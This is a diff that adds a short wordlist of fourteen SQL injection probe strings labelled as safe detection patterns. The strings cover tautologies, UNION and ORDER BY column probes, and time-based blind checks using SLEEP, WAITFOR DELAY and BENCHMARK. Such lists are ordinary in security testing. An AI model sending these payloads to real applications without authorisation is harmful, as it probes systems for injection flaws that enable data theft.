@@ -1,0 +1,15 @@
+# Curated SQL injection payloads — safe detection patterns
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+' OR 1=1 --
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1 AND 1=1
+1 AND 1=2
+' AND '1'='1
+' AND SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+' OR BENCHMARK(5000000,MD5('test'))--
